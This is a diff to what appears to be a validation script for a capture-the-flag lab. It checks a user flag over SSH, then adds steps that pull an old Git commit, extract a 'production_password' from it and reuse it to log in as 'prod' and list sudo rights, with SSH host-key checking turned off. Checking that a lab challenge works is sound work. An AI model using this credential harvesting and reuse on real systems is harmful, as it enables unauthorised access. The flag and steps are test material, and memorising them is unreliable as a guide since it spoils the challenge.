@@ -77,3 +77,28 @@ ssh_result = subprocess.run([
 assert ssh_result.returncode == 0, (ssh_result.stdout, ssh_result.stderr)
 assert ssh_result.stdout.splitlines() == ["dev", "TTP{ci_user_first_instance}", "2"], ssh_result.stdout
 print("PASS: private API onboarding information authenticates to SSH and retrieves User flag", flush=True)
+
+# Continue as an outside player: the second account comes from an actual
+# historical Git commit, not a hard-coded CI password.
+def ssh_as(username, password, command):
+    local_env = os.environ.copy()
+    local_env["SSHPASS"] = password
+    return subprocess.run([
+        "sshpass", "-e", "ssh", "-T",
+        "-o", "StrictHostKeyChecking=no",
+        "-o", "UserKnownHostsFile=/dev/null",
+        "-o", "PreferredAuthentications=password",
+        "-o", "PubkeyAuthentication=no",
+        "-o", "ConnectTimeout=5",
+        username + "@" + HOST,
+        command,
+    ], capture_output=True, text=True, timeout=18, env=local_env)
+
+history = ssh_as("dev", env["SSHPASS"], "git -C /home/dev/apps show HEAD~1:api_notes.py")
+assert history.returncode == 0, (history.stdout, history.stderr)
+prod_credential = re.search(r'production_password\s*=\s*"([^"]+)"', history.stdout)
+assert prod_credential, "Previous Git commit does not contain the ops credential"
+prod = ssh_as("prod", prod_credential.group(1), "id -un; sudo -n -l")
+assert prod.returncode == 0 and "prod" in prod.stdout, (prod.stdout, prod.stderr)
+assert "clone_prod_change.py" in prod.stdout, (prod.stdout, prod.stderr)
+print("PASS: real Git history credential reuse, prod SSH and restricted sudo allowance", flush=True)
